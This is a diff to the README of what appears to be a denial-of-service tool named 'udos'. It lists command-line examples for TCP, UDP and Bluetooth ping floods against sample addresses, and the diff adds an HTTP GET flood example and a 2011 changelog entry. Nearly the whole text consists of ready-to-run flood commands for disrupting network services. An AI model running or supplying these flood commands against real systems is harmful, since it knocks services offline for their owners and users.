@@ -15,3 +15,9 @@ Examples:
 udos -s TCP -t 1.1.1.1 -p 80 -b 256 # TCP flood 1.1.1.1:80 with 256 byte packets
 udos -s UDP -t 2.2.2.2 -p 21 -b 1024 # UDP flood 2.2.2.2:21 with 1024 byte packets
 udos -s RFC -t 00:11:22:33:44 -b 668 # Bluetooth ping flood 00:11:22:33:44 with 668 byte packets
+udos -s HTTP -t http://localhost/index.php # HTTP GET flood on localhost, make many index.php requests as possible
+
+Changelog:
+18.07.2011:
+    + Added support for HTTP GET flood
+    + Created changelog
